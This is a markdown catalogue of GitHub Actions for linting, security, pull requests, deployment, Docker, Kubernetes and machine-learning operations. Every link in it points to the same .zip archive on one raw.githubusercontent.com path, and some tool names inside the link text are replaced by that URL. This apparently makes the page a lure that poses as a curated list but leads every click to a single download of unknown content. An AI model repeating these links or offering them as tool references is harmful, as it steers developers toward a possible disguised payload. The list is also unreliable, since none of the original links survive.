- [Run ESLint, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [JavaScript-based linter for \*.workflow files](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Lint terraform files using tflint, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [autopep8: Automatically formats Python code to conform to the PEP 8 style guide](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run `ergebnis/composer-normalize` to ensure your PHP project has a normalized `https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip`](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run `stolt/lean-package-validator` to ensure your package has only the required `runtime` artifacts](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Go lint checks on PR event](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip - Automatically run the `format` and/or `lint` script used by the package](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Stylelinter - GitHub Action that runs stylelint](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run stylelint, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [PyCodeStyle Action - A GitHub Action that leaves a comment on your PR with pycodestyle (autopep8) feedback](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [wemake-python-styleguide - The strictest and most opinionated python linter ever, with optional reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run TSLint with status checks and file diff annotations](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Lint Pull Request commits with commitlint](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run vint, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run mispell, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run golangci-lint, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run shellcheck, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Catch insensitive, inconsiderate writing in your markdown docs](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run dotenv-linter - Lints your .env files like a charm, with optional reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run dotenv-linter, with reviewdog output on the PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Show and auto-fix linting errors for many programming languages](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [PHP_CodeSniffer With Annotations](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Linter for markdown (with presets)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Stylelint problem matcher to create annotations](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run sqlcheck on the PR to identifies anti-patterns in SQL queries](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Validate Fastlane Supply Metadata Against the Play Store Guidelines](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Golint to lint your Golang code](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

#### Security

- [A vulnerability scanner for your docker images](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Automatically approve and merge Dependabot updates](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run dlint security linter on your Python code](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [AWS Secrets Manager Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Define AWS Secrets Manager secrets to environment values.
- [Linting your AWS IAM policy documents for correctness and security issues](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Secret Spreader](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Not an action per se, but a tool to manage Actions Secrets across a list of repositories.
- [Secrets Sync Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Action syncs secrets across multiple repositories.
- [Snyk Test Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Manage Your GitHub Actions Secrets With A Simple CLI](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [SecretHub](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Have a single source of truth for your secrets and load them into GitHub Actions on demand.

#### Code Coverage

- [Scan code with SonarCloud](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send your code coverage to https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publishing code coverage to CodeClimate](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Update repository go report card](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### Dynamic Analysis

- [Run Gofmt to check Golang code formatting](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Goimports to check Golang imports order](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### Monitoring

- [Audit a webpage with Google Chrome's Lighthouse tests](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Runs Lighthouse and posts results to PRs and Slack](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Lighthouse in CI using GitHub Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Continuous Benchmarking and Benchmark Visualization for Go](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Size Limit Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Comments cost comparison of your JS in PRs and rejects them if limit is exceeded.
- [Check bundlephobia](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Comments new and modified package size according to https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip website and rejects PR on threshold surpassed.

### Pull Requests

- [Set PR Reviewers Based on Assignees](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Open or Update PR on Branch Push (with Branch Selection)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Automatically Rebase a PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Label PR once it has a Specified Number of Approvals](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Add Labels to a PR based on Matched File Patterns](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Auto-Approve PRs](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Automatically add Reviewers to PR based on the Configuration File](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Add Labels to a PR based on Branch Name Patterns](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Add Labels to a PR based on Total Size of the Diff](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Automatically merge PRs That Are Ready](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Verify That PRs Contain a Ticket Reference](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Create a PR for Changes to your Repository in the Actions Workspace](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Lint a PR](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [ChatOps for PRs](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Prefix Title and Body of a PR Based on Text Extracted from Branch Name](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Block Autosquash Commits](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Automatically Bump and Tag on Merge](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Automatically Update PRs with Outdated Checks and Squash and Merge the Ones Matching All Branch Protections](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Merge Pal - Automatically Update and Merge PRs](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Enforce naming convention on pull request title](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Pull Request Stuck Notifier](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Lint pull request name with commitlint (Awesome if you squash merge !)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Block PR merges when Checks for target branches are failing](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Get generated static site screenshots updated by Pull Request](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Add Labels Depending if the Pull Request Still in Progress](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Ticket Check Action](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Automatically add a ticket or issue number to the start of all Pull Request titles.
- [Pull Request Lint With Regex](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Pull Request Landmines](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Annotate a GitHub Pull Request Based on a Checkstyle XML-Report](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Pull Request Stats](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) -  Print relevant stats about reviewers.
- [Pull Request Description Enforcer](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Enforces description on pull requests.

### GitHub Pages

- [Deploy a Zola site to GitHub Pages](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Build Hugo static content site and publish it to gh-pages branch](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Build a Jekyll site—with Custom Jekyll Plugins & Build Scripts—and deploy it back to the Gh-Pages Branch](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Google Dataset Search Metadata](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - And other https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip extractors to make datasets discoverable from GitHub pages.
- [GitHub Actions for deploying to GitHub Pages with Static Site Generators](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Action for Hexo](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy Google Analytics stats to GitHub Pages](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [A Jupyter Notebook Blogging Platform Powered by GitHub Actions, Pages and Jekyll](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy A Static Site to GitHub Pages](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Deploy to custom directory and ignore folder/file.
- [Deploy to GitHub Pages with Advanced Settings](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### Notifications and Messages

- [Send a Discord notification](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Post a Slack message as a bot](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send an SMS from GitHub Actions using Nexmo](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send an SMS from GitHub Actions using Clockworksms](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send a Telegram Message](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send a File or Text Message to Discord (custom define color, username or avatar)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Collaborate on tweets using pull requests](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send a Push Notification via Push by Techulus](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send email with SendGrid](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send a Push Notification via Join](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [New package version checker for npm](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [New package version checker for NuGet](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [New package version checker for Gradle](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send a Push Notification via Pushbullet](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Create an Outlook Calendar Event using Microsoft Graph](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Watch for GitHub Wiki page changes and post to Slack](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send an SMS using MessageBird](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Reply to Stale Bots](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send an Embed Message to Discord](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Keep Your PRs in Sync With Teamwork Tasks](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Send Microsoft Teams Notification](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### Deployment

- [Deploy to Netlify](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy a Probot App using Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy a playlist to Spotify](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy VS Code extensions with vsce](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Purge Cloudflare cache after updating a website](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy your DNS configuration using DNS Control](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy a Theme to Shopify](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Trigger multiple GitLab CI Pipeline](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Trigger multiple Jenkins Jobs](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Action for Homebrew Tap](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Copy files and artifacts via SSH](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Executing remote ssh commands](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish a Python distribution package to PyPI](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy Static Website to Azure Storage](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Cross platform Chocolatey CLI to build and publish packages](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy iOS Pod Library to Cocoapods](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Action for TencentCloud Serverless](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish npm (pre)releases](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy a static site to https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Action for GoReleaser, a release automation tool for Go projects](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [FTP Deploy Action, Deploys a GitHub project to a FTP server using GitHub actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish Article to https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Action For Semantic Release](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy a Collection to Ansible Galaxy](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish module to Puppet Forge](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Build and publish Electron apps](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish a Maven package](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Build and deploy a theme to Ghost CMS](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy an Ansible role to Ansible Galaxy](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish one or more JS modules to a registry](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish a package with 2FA using Slack](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Serialize Workflow Runs in Continuous Deployment Pipelines](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Netlify Deploy GitHub Action for each commit](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Ansible Playbooks](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish a Python Distribution Package to Anaconda Cloud](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy VS Code Extension to Visual Studio Marketplace or the Open VSX Registry](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy a YouTube Video to https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip Podcast](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy with AWS CodeDeploy](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

#### Docker

- [Update a Docker Hub repository description from https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish Docker Images to the GitHub Package Registry (GPR)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Update a repository's "Full description" on Docker Hub](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Build and publish docker images to any registry using Kaniko](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Monitor and limit your docker image size](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Publish Docker Images to the Amazon Elastic Container Registry (ECR)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Build And Push Your Docker Images Caching Each Stage To Reduce Build Time](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Set up Docker Buildx](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Convert Branch or Tag Name Into Docker-Compatible Image Tag](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Update a Container Repository Description From https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Supported Registries: Docker Hub, Quay, Harbor.

#### Kubernetes

- [Deploy to any Cloud or Kubernetes Using Pulumi](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy to Kubernetes with kubectl](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Get Kubeconfig File From Google Kubernetes Engine (GKE)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Kustomize Kubernetes Config YAMLs](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Create a Kubernetes Cluster for Testing Using Krucible](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

#### AWS

- [Sync/upload a directory to an AWS S3 bucket](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploy Lambda code to an existing function](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

#### Terraform

- [Generate terraform documentation](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Uses terraform-docs to generate docs for terraform modules.
- [An example of using Terraform to validate and apply GitHub administration](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### External Services

- [Use a Jenkinsfile](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Action for Firebase](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Action for Contentful Migration CLI](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Pixela (a-know/pi)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Action for Google Cloud Platform (GCP)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Upload files to any OpenStack Swift service provider](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Action for sending Stack Overflow posts to Slack](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Assume AWS role](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Generate Custom Response using JSONbin](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

### Frontend Tools

- [Execute Gradle task](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [JS Build Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Run Grunt or Gulp build tasks and commit file changes.
- [GitHub Action for Gatsby CLI](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Runs a WebPageTest audit and prints the results as commit comment](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Hugo extended](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Generate OG Image](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Generate customisable open graph images from Markdown files.
- [GitHub Actions for mdBook](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Setup Mint](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Setup Mint (programming language for writing single page applications).
- [Gatsby AWS S3 Deployment](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Deploy Gatsby to S3 (supports CloudFront).

### Machine Learning Ops

- [Submitting Argo Workflows (Cloud Agnostic)](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Submitting Argo Workflows to GKE](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Query Experiment Tracking Results From Weights & Biases](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Parameterized Jupyter Notebooks](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Compile, Deploy and Run Kubeflow Pipeline](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Automatically Dockerize A Data-Science Repo As A Jupyter Server](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Azure Machine Learning With GitHub Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

